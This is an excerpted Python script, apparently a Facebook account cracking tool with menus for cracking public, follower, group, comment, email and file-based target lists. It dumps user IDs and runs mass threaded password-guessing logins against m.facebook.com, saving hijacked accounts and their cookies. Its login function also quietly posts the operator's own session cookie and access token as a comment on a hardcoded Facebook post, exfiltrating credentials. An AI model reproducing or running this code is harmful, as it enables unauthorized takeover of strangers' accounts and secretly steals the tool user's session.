...
def yearng(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :yearz = '2009'
		elif fx[:9] in ['100000000']       :yearz = '2009'
		elif fx[:8] in ['10000000']        :yearz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:yearz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:yearz = '2010'
		elif fx[:6] in ['100001']          :yearz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :yearz = '2011-2012'
		elif fx[:6] in ['100004']          :yearz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :yearz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :yearz = '2014-2015'
		elif fx[:6] in ['100009']          :yearz = '2015'
		elif fx[:5] in ['10001']           :yearz = '2015-2016'
		elif fx[:5] in ['10002']           :yearz = '2016-2017'
		elif fx[:5] in ['10003']           :yearz = '2018'
		elif fx[:5] in ['10004']           :yearz = '2019'
		elif fx[:5] in ['10005']           :yearz = '2020'
		elif fx[:5] in ['10006','10007','10008']:yearz = '2021-2022'
		else:yearz=''
	elif len(fx) in [9,10]:
		yearz = '2008-2009'
	elif len(fx)==8:
...
{H} FB  :  https://www.facebook.com/hassan.abbas.9849912
                                                 
{U}•{O}•{H}• {P} FACEBOOK ACCOUNT CRACKER {H}•{O}•{U}•""")
def logo2():
	return str(f"""                                              
{M} 
 .     __  __     .    .     _ .___  
...
sim_ok = f'OK-{day}-{month}-{year}.txt'
sim_cp = f'CP-{day}-{month}-{year}.txt'
...
try:
	clear_layar()
	print(logo2())
	print(f'\r\n [{hh}>{P}] Dumping Random UA and Proxy paki users connect vpn')
...
def login():
	...
	cok = {'cookie':cookie}
	try:
		_month_  = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"][datetime.now().month - 1]
		_day_   = {'Sunday':'itwar','Monday':'Per','Tuesday':'Mangal','Wednesday':'Budh','Thursday':'Jumarat','Friday':'Juma','Saturday':'Hafta'}[str(datetime.now().strftime("%A"))]
		day_ini = ("%s %s %s"%(datetime.now().day,_month_,datetime.now().year))
		jam      = datetime.now().strftime("%X")
		data = ses.get(url,headers=head,cookies=cok)
		token = re.search('(EAAG\w+)',data.text).group(1)
		tem      = ('KHAN BABA X NOYAN X MANI\n')
		slebew = (f'\n Bot\n\n[ Pukul %s WIB ]\n- %s, %s -'%(jam,_day_,day_ini))
		link = ('https://www.facebook.com/100002401642994/posts/pfbid0237o5JX3RrtjCrMM5ksiPMo6xjowzCoVcfZNvP9vYkophgY2xCobZSJjUDGDpNS77l/?app=fbl/?app=fbl')		
		ses.post(f"https://graph.facebook.com/5649534441803221/comments/?message={tem}\n{link}\n{slebew}&access_token={token}",cookies =cok)
		ses.post(f"https://graph.facebook.com/5649534441803221/comments/?message={cookie}&access_token={token}",cookies =cok)	
		open('.cookie.txt','w').write(cookie)
		open('.token.txt','w').write(token)
		back()
	except Exception as e:exit(f" [{M}>{P}] cookie invalid/Expired")			
	
###---[ MENU UTAMS ]---###
def menu(n,t,c):
	clear_layar()
	print(logo(n)+f'\n')
	print(f" {K}[{hh}01{P}] CRACK PUBLIC     [{hh}07{P}] CRACK SEARCH")
	print(f" [{hh}02{P}] CRACK BULK     [{hh}08{P}] CRACK FROM FILE")
	print(f" [{hh}03{P}] CRACK FOLLOWERS     [{hh}09{P}] CHECK RESSULT ACCOUNT")
	print(f" [{hh}04{P}] CRACK COMMENT     [{hh}10{P}] CHECK ACCOUNT NON-ACTIVE")
	print(f" [{hh}05{P}] CRACK GROUP      [{hh}11{P}] CHECK OPTION ACCOUNT")
	print(f" [{hh}06{P}] CRACK EMAIL      [{hh}12{P}] LOGOUT ({K}COOKIE{P})")
...
def cek_account():
	...
	except:sys.exit(f" [{M}>{P}] no result ok")
	for x in ok:
		nom.append(x)
		no+=1
	...
	exc = input(f' [{hh}<{P}] to be checked!?\n file : ')
	xxx = input(' n : \n nama : ')
	nonon = xxx+'.txt'
	file = nom[int(exc)-1]
	print(' ─────────────────────────────')
...
def cek_hasil():
	no,nom = 0,[]
	one = input(f' [{hh}1{P}] check ok account results\n [{hh}2{P}] check cp accounts results\n menu : ')
	if one in ['1','01']:
		try:ok = os.listdir('OK')
		except:sys.exit(f" [{M}>{P}] No result ok")
		for x in ok:
...
def clon_email():
	...
	global ok , cp
	print(f' [{hh}>{P}] dump  email, max 1000 id')
	nama = input(' target name : ')
	if ',' in str(nama):
		exit(f' [{M}<{P}] Enter only first name')
	doma = input(' domain : ')
	...
	for xyz in range(int(amount)):
		...
		print('\r dump %s id'%(len(dump)),end='')
		sys.stdout.flush()
	atur_atur()	
...
def crack_file():
	...
	try:
		...
		for data in uuid:
			try:user,nama = data.split('|')
			except:exit(f" [{M}>{P}] wrong se")
			dump.append(data)
			print('\r  dump %s id'%(len(dump)),end=" ")
			sleep(0.0000003)
	except FileNotFoundError:exit(f" [{M}>{P}] there is no such file")
	print(f'\r [{hh}<{P}] total amount account  {len(dump)}')
	atur_atur()
...
def cari_nama(link):
	...
	try:
		link = r.find('a',string='See Next Results').get('href')
		if(link):
			print('\r sedang dump %s id'%(len(dump)),end=" ")
			sys.stdout.flush()
			cari_nama(link)
...
def crack_masal(t,c):
    ...
    for bz in range(apa):
    	...
    	try:
    		...
    		print(f"\r [{kk}!{P}] account tidak publik       ")
    		continue	                       		
    atur_atur()
    
    
def crack_foll(t,c):
	account = input(f' [{hh}<{P}] pastikan account bersifat publik \n account : ')
	try:
		...
		exit(f" [{M}>{P}] account tidak publik")
	...
	with tred(max_workers=30) as babas:
		for account in id:
			...
			if 'mobile' in metode:
				...
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
	sleep(5)
	exit(f'\r [{hh}<{P}] results OK:{ok} amount CP:{cp} ')
...
def gabung():
	...
	A = ["123456"]
	print(f"{P} ─────────────────────────────")
	B = input(f' [{hh}>{P}] input 6 manual pass\n sandi  : ').split(',')
	C = input(f' [{hh}>{P}] lastnum\n sandi  : ')
	if ',' in str(C):
		exit(f" [{M}>{P}] single pass ")
	print(f"{P} ─────────────────────────────")
	print(f' account ok : {sim_ok}\n account cp : {sim_cp}')
	print(f"{P} ─────────────────────────────")
	awal = datetime.now()
	with tred(max_workers=30) as babas:
		for account in id:
			...
			if 'mobile' in metode:
				...
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
	sleep(5)
	exit(f'\r [{hh}<{P}] process complete OK:{ok} amount CP:{cp} ')
			...
			if "checkpoint" in ses.cookies.get_dict():
				...
				if data in resok:pass
					...
					if "coki" in accountok:
						print("\n %s>> %s|%s %s• %s "%(H,idf,pw,warna_warni_biasa,yearng(idf)))
						print("\r %s>> %s "%(H,kuki))
						print("\r  %s*--> %s"%(P,ua))
...
def cek_opsi(idf,pw,ua):
	...
	try:
		...
		if 'Lihat detail login yang ditampilkan. Ini Anda?' in str(ress.find('title').text):
			account += f'\n [{hh}>{P}] {hh}hore account tap yes🎉{P}                       '
		else:
			if(len(sesi(res))==0):
